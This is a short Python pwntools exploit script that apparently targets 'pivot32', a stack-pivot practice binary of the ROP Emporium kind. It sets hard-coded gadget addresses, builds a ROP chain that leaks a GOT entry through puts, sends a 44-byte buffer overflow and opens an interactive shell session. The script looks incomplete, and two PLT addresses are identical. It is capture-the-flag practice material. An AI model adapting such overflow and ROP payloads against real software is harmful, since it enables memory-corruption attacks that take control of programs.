from pwn import *

foothold_plt = 0x08048520
foothold_got = 0x0804a024
puts_plt = 0x08048520
pwnme = 0x08048750

pop_eax = 0x0804882c # pop eax ; ret
pop_ebp = 0x0804889a # pop edi ; pop ebp ; ret
popal = 0x0804874d # popal ; cld ; ret

payload_1 = b"".join([
    p32(foothold_plt),
    p32(puts_plt),
    p32(foothold_got),
    p32(pwnme),
])

payload_2 = b"".join([
    b"A"*44,
    p32(popal),
])

print(len(payload_2))

p = process("./pivot32")
input()
p.send(payload_1+b"\n")
p.send(payload_2+b"\n")

leak = p.recv()
print(f"Leak: {leak}")

p.interactive()
